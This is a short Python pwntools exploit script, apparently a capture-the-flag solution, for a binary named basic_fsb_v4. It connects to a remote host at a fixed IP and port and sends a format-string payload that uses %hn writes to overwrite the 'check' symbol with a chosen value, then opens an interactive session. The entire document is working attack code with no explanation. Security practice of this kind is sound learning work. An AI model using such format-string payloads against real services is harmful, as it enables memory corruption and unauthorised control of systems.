from pwn import *

# p = process("./basic_fsb_v4")
p = remote("141.164.39.45", 8004)
e = ELF("./basic_fsb_v4")

check = e.symbols['check']

# 0x87654321ABCD
pl = b''
pl += '%{}c'.format(0xABCD).encode()
pl += '%11$hn'.encode()

pl += '%{}c'.format(0x10000 + 0x4321 - 0xABCD).encode()
pl += '%12$hn'.encode()

pl += '%{}c'.format(0x8765 - 0x4321).encode()
pl += '%13$hnA'.encode()

pl += p64(check)
pl += p64(check + 2)
pl += p64(check + 4)

pause()
p.send(pl)

p.interactive()